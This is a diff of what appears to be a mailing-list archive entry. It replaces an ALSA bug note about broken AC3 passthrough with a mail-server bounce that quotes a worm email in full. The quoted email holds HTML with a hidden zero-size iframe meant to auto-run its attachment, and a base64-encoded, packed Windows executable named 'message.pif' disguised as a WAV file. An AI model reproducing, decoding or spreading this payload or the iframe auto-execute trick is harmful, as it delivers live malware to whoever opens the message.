@@ -1,16 +1,9 @@
-From: bugtrack@alsa-project.org
-Subject: [ALSA - driver 0000214]: ac3 passthrough not working
-Date: Sat, 11 Sep 2004 05:25:55 +0200 (CEST)
+From: Mail Delivery System <Mailer-Daemon@zwaard.nl.uu.net>
+Subject: Mail delivery failed: returning message to sender
+Date: Sat, 11 Sep 2004 04:12:04 +0000
 Sender: alsa-devel-admin@lists.sourceforge.net
-Message-ID: <20040911032555.644F54904E@server.perex-int.cz>
-Content-Type: text/plain; charset=iso-8859-1
+Message-ID: <E1C5zF6-0000yF-Ju@zwaard.nl.uu.net>
 Return-path: <alsa-devel-admin@lists.sourceforge.net>
-Received: from mail.perex.cz (gate.perex.cz [82.113.61.162])
-	by alsa.alsa-project.org (ALSA's E-mail Delivery System) with ESMTP id C2011247
-	for <alsa-devel@alsa-project.org>; Sat, 11 Sep 2004 05:25:55 +0200 (MEST)
-Received: from server.perex-int.cz (server.perex-int.cz [192.168.100.2])
-	by gate.perex-int.cz (Perex's E-mail Delivery System) with ESMTP id 7E9BC220B8
-	for <alsa-devel@alsa-project.org>; Sat, 11 Sep 2004 05:25:55 +0200 (MEST)
 Errors-To: alsa-devel-admin@lists.sourceforge.net
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/alsa-devel>,
 	<mailto:alsa-devel-request@lists.sourceforge.net?subject=unsubscribe>
@@ -19,53 +12,169 @@ List-Help: <mailto:alsa-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/alsa-devel>,
 	<mailto:alsa-devel-request@lists.sourceforge.net?subject=subscribe>
 List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=alsa-devel>
-To: alsa-devel@alsa-project.org
+To: alsa-devel@lists.sourceforge.net
 List-Id: alsa-devel@alsa-project.org
 
+This message was created automatically by mail delivery software.
 
-A BUGNOTE has been added to this bug.
-======================================================================
-https://bugtrack.alsa-project.org/alsa-bug/bug_view_page.php?bug_id=0000214
-======================================================================
-Reported By:                m_stolle
-Assigned To:                
-======================================================================
-Project:                    ALSA - driver
-Bug ID:                     214
-Category:                   PCI - intel8x0
-Reproducibility:            always
-Severity:                   feature
-Priority:                   normal
-Status:                     new
-Distribution:               Debian
-Kernel Version:             2.4.25
-======================================================================
-Date Submitted:             04-16-2004 05:06 CEST
-Last Modified:              09-11-2004 05:25 CEST
-======================================================================
-Summary:                    ac3 passthrough not working
-Description: 
-I have a Dell Inspiron 8200 with an Intel ICH3/Cirrus Logic CS4205 sound
-card.  Unfortunately, the hardware AC3 passthrough does not work. 
-Instead, I only get a high-pitched funny noise.
+A message that you sent could not be delivered to one or more of its
+recipients. This is a permanent error. The following address(es) failed:
 
-The symptoms are the same in mplayer as well as in xine.  Verbose output
-of mplayer provided below:
-======================================================================
+  henk@anda.nl
+    SMTP error from remote mailer after end of data:
+    host anda.demon.nl [212.238.219.30]: 550 Error:
+    Email attachments that contain or end in "pif" are prohibited on this server as they may contain viruses. The file named "message.pif" was rejected.
 
-----------------------------------------------------------------------
- m_stolle - 09-11-2004 05:25 CEST 
-----------------------------------------------------------------------
-This bug is still present in 2.6.8.1  Am I the only one with this bug?
+------ This is a copy of the message, including all the headers. ------
+------ The body of the message is 41596 characters long; only the first
+------ 8192 or so are included here.
 
-Bug History
-Date Modified  Username       Field                    Change              
-======================================================================
-04-16-04 05:06 m_stolle       New Bug                                      
-04-16-04 05:06 m_stolle       Distribution              => Debian          
-04-16-04 05:06 m_stolle       Kernel Version            => 2.4.25          
-09-11-04 05:25 m_stolle       Bugnote Added: 0001744                       
-======================================================================
+Return-path: <alsa-devel@lists.sourceforge.net>
+Received: from [219.137.138.229] (helo=anda.nl)
+	by zwaard.nl.uu.net with esmtp id 1C5z5q-0006eE-48
+	for henk@anda.nl; Sat, 11 Sep 2004 04:02:30 +0000
+From: alsa-devel@lists.sourceforge.net
+To: henk@anda.nl
+Subject: Delivery Bot (henk@anda.nl)
+Date: Sat, 11 Sep 2004 12:03:15 +0800
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	type="multipart/alternative";
+	boundary="----=_NextPart_000_001B_01C0CA81.7B015D10"
+X-Priority: 1
+X-MSMail-Priority: High
+Message-Id: <E1C5z5q-0006eE-48@zwaard.nl.uu.net>
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_001B_01C0CA81.7B015D10
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_001_001C_01C0CA81.7B015D10"
+
+------=_NextPart_001_001C_01C0CA81.7B015D10
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+------=_NextPart_001_001C_01C0CA81.7B015D10
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META content=3D"text/html; charset=3Diso-8859-1" =
+http-equiv=3DContent-Type>
+<META content=3D"MSHTML 5.00.2920.0" name=3DGENERATOR>
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=3D#ffffff><br>Delivery Agent - Translation failed<br><br>------------- failed message -------------<br>0ßv'~cN6#*cPO<äJ6,Sj79O&n)hpD!(9<arWy|kll%3D<br>&bixG_öwqWusMB9op?M!nkA#:)SZF.Oq>E;~iPiJGiv:<br>&vB)rz_Xß0dPXDc$vNUgfElT$;&%ö?l3SlßoöxZMTQ<br>iR2T1-YsXü$~os~ouq9B(LfA|a<br><br>Message has been sent as a binary attachment.<br>
+
+Or you can view the message at:<br><br>
+<a href=3Dcid:121401Mfdab4$3f3dL780$75387018@57W81fa70Re height=3D0 width=3D0>www.anda.nl/inmail/henk/mread.php?sessionid-32606</a>
+<iframe
+src=3Dcid:121401Mfdab4$3f3dL780$75387018@57W81fa70Re height=3D0 width=3D0></iframe> 
+<DIV>&nbsp;</DIV></BODY></HTML>
+
+------=_NextPart_001_001C_01C0CA81.7B015D10--
+
+------=_NextPart_000_001B_01C0CA81.7B015D10
+Content-Type: audio/x-wav;
+	name="message.pif"
+Content-Transfer-Encoding: base64
+Content-ID:<121401Mfdab4$3f3dL780$75387018@57W81fa70Re>
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4g
+RE9TIG1vZGUuDQ0KJAAAAAAAAAAxzIXZda3rinWt64p1reuKda3qimet64oXsviKcK3rip2y
+4Ip3reuKzavtinSt64pSaWNoda3rigAAAAAAAAAAQ29tcHJlc3NlZCBieSBQZXRpdGUgKGMp
+MTk5OSBJYW4gTHVjay4AAFBFAABMAQMA76BkQAAAAAAAAAAA4AAPAQsBBgAABAAAAGYAAAAA
+AABCoAAAABAAAAAgAAAAAEAAABAAAAACAAAEAAAAAAAAAAQAAAAAAAAAALAAAAAEAAAAAAAA
+AgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA/KEAANAAAAAAQAAAaF8AAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAMAAAABAAAAAGAAAACAAAAAAAAAAAAAAAAAAAYAAA4AAAAAAAAAAAAGAAAABAAABoXwAA
+AA4AAAAAAAAAAAAAAAAAAEAAAEAucGV0aXRlAMwCAAAAoAAAAAQAAAAEAAAAAAAAAAAAAAAA
+AABgAADiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+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
+AgAAAKgAAIAAAAAAAAAAAAAAAAABAAAAIAEAgMAAAIAAAAAAAAAAAAAAAAAAAAEABwQAANgA
+AAAAAAAAAAAAAAAAAAAAAAEABwQAAOgAAAAAAAAAAAAAAAAAAAAAAAEABwQAAPgAAAAAAAAA
+AAAAAAAAAAAAAAEABwQAAAgBAABkRQAAAFoAAAAAAAAAAAAAPEQAACgBAAAAAAAAAAAAAFRB
+AADoAgAAAAAAAAAAAAAwQQAAIgAAAAAAAAAAAAAAAwBCAEkATgABADAAAAAAAAAAAAAAAAAA
+AAABAAIAEBAQAAEABAAoAQAAAQAgIBAAAQAEAOgCAAACAAAAKAAAACAAAABAAAAAAQAEAAAA
+AACAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAIAAAACAgACAAAAAgACAAICAAADAwMAA
+gICAAAAA/wAA/wAAAP//AP8AAAD/AP8A//8AAP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAACIiIiIiIiIiIiIiIiIgAAAj////////////////4AAAIf///////////////eAAACP
+f/////////////9/gAAAj/f////////////3/4AAAI//f///////////f/+AAACP//f/////
+////9///gAAAj///f////////3///4AAAI////f///////f///+AAACP//93d3d3d3d3f///
+gAAAj//3f39/f39/f3f//4AAAI//d/f39/f39/f3f/+AAACP939/f39/f39/f3f/gAAAh3f3
+9/f39/f39/f3d4AAAI9/f39/f39/f39/f3+AAACP////////////////AAAACP//////////
+////8AAAAACP/////////////wAAAAAACP////////////AAAAAAAACP//////////8AAAAA
+AAAACP/////////wAAAAAAAAAACP////////AAAAAAAAAAAACP//////8AAAAAAAAAAAAACP
+/////wAAAAAAAAAAAAAACIiIiIgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAP/////////////////////AAAADwAAAA8AAAAPAAAADwAAAA8AAAAPAAAADwAAAA8AA
+AAPAAAADwAAAA8AAAAPAAAADwAAAA8AAAAPAAAADwAAAB+AAAA/wAAAf+AAAP/wAAH/+AAD/
+/wAB//+AA///wAf//+AP////////////KAAAABAAAAAgAAAAAQAEAAAAAADAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAIAAAIAAAACAgACAAAAAgACAAICAAACAgIAAwMDAAAAA/wAA/wAA
+AP//AP8AAAD/AP8A//8AAP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf///////AAB3
+//////cAAH9/////fwAAf/f///f/AAB/f3d3f38AAHf4+Pj49wAAf4+Pj4+PAAAH+Pj4+PAA
+AAB/j4+PAAAAAAf4+PAAAAAAAHd3cAAAAAAAAAAAAAAAAAAAAAAAAP//AAD//w
 
 
 -------------------------------------------------------
